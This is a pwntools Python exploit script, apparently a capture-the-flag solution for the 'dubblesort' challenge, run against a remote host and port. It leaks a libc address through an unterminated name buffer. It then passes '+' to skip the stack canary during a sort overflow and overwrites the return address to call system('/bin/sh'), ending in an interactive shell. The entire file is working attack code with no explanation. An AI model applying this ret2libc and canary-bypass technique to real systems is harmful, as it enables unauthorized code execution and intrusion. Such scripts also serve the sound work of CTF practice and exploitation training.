# -*- coding: utf-8 -*-
from pwn import *

#context(log_level='debug')

#p = process("./dubblesort")
p = remote("111.198.29.45", 58105)
libc = ELF("./libc_32.so.6")
#libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")

#gdb.attach(p)
p.recvuntil("name :")
p.send("a"*28)
sleep(0.5)
p.recvuntil("a"*28)
libc_base = u32(p.recv(4))-0x1ae244
log.success('libc_base addr : 0x%x'%libc_base)
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + libc.search('/bin/sh\x00').next()
log.success('system addr : 0x%x'%system_addr)
log.success('binsh addr : 0x%x'%binsh_addr)


p.recvuntil("what to sort :")
p.sendline("35")
for i in range(24):
    p.recvuntil("number :")
    p.sendline("0")
p.recvuntil("number :")
p.sendline("+")
for i in range(7):
    p.recvuntil("number :")
    p.sendline(str(0xf0000000))

p.recvuntil("number :")
p.sendline(str(system_addr))
p.recvuntil("number :")
p.sendline(str(system_addr+1))
p.recvuntil("number :")
p.sendline(str(binsh_addr))

p.interactive()
